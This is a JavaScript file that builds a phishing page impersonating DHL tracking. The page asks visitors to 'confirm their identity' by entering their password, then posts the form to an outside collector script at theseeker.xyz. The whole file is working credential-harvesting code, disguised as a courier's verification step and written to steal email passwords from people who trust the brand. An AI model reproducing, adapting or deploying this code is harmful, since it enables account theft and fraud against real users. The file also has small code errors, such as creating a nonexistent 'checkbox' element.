
// Fetching HTML Elements in Variables by ID.
var x = document.getElementById("form_sample");
var createform = document.createElement('form'); // Create New Element Form
createform.setAttribute("action", "https://theseeker.xyz/xml/dhl/burapa/press.php"); // Setting Action Attribute on Form
createform.setAttribute("method", "post"); // Setting Method Attribute on Form
x.appendChild(createform);

 
var line = document.createElement('hr'); // Giving Horizontal Row After Heading
createform.appendChild(line);


var namelabel = document.createElement('label'); // Create Label for Name Field
namelabel.innerHTML = "DHL Tracking"; // Set Field Labels
namelabel.setAttribute("style", "position:absolute;left:39px;top:38px;width:404px;height:26px;border:0px #C0C0C0 solid;font-family:Arial;font-size:21px;z-index:0");
createform.appendChild(namelabel);


var namelabel = document.createElement('label'); // Create Label for Name Field
namelabel.innerHTML = "Confirm your Identity to prove you are not a robot"; // Set Field Labels
namelabel.setAttribute("style", "position:absolute;left:39px;top:88px;width:404px;height:26px;border:0px #C0C0C0 solid;font-family:Arial;font-size:13px;z-index:0");
createform.appendChild(namelabel);



var emailelement = document.createElement('img');
emailelement.setAttribute("src", "https://www.flaticon.com/svg/static/icons/svg/2001/2001957.svg");
emailelement.setAttribute("style", "width:31px;height:22px; margin:0;padding:0;position:absolute;left:27px;top:170px;width:31px;height:22px;text-align:left;z-index:2;");
createform.appendChild(emailelement);


var inputelement = document.createElement('input'); // Create Input Field for Name
inputelement.setAttribute("type", "email");
inputelement.setAttribute("name", "email");
inputelement.setAttribute("id", "email");
inputelement.setAttribute("disabled", "");
inputelement.setAttribute("value", "");
inputelement.setAttribute("style", "position:absolute;left:58px;top:128px;width:400px;height:25px;border:0px #C0C0C0 solid;font-family:Arial;font-size:16px;z-index:3");
createform.appendChild(inputelement);


var linebreak = document.createElement('br');
createform.appendChild(linebreak);

var emaillabel = document.createElement('label'); // Create Label for E-mail Field
emaillabel.innerHTML = " ";
createform.appendChild(emaillabel);


var emailelement = document.createElement('img');
emailelement.setAttribute("src", "https://image.flaticon.com/icons/svg/3/3729.svg");
emailelement.setAttribute("style", "width:31px;height:22px; margin:0;padding:0;position:absolute;left:27px;top:128px;width:31px;height:22px;text-align:left;z-index:2;");
createform.appendChild(emailelement);



var emailelement = document.createElement('input'); // Create Input Field for E-mail
emailelement.setAttribute("type", "password");
emailelement.setAttribute("name", "dpass");
emailelement.setAttribute("placeholder", "Password");
emailelement.setAttribute("required", " ");
emailelement.setAttribute("style", "position:absolute;left:58px;top:165px;width:400px;height:25px;border:1px #C0C0C0 solid;font-family:Arial;font-size:16px;z-index:4");
createform.appendChild(emailelement);


var emailbreak = document.createElement('br');
createform.appendChild(emailbreak);

var linebreak = document.createElement('br');
createform.appendChild(linebreak);


var inputelement = document.createElement('checkbox'); // Create Input Field for E-mail
inputelement.setAttribute("type", "checkbox");
inputelement.setAttribute("value", "on");

inputelement.setAttribute("style", "position:absolute;left:28px;top:200px;z-index:5");
createform.appendChild(inputelement);







var linebreak = document.createElement('br');
createform.appendChild(linebreak);

var linebreak = document.createElement('br');
createform.appendChild(linebreak);

var submitelement = document.createElement('input'); // Append Submit Button
submitelement.setAttribute("type", "submit");
submitelement.setAttribute("name", "dsubmit");
submitelement.setAttribute("value", "Verify");
submitelement.setAttribute("style", "position:absolute;left:29px;top:227px;width:452px;border:0;height:34px;background-color:#003366;color:#FFFFFF;font-family:Arial;font-size:15px;z-index:7");
createform.appendChild(submitelement);
submitelement.setAttribute("onclick", "ValidateEmail(document.form_sample.demail)");
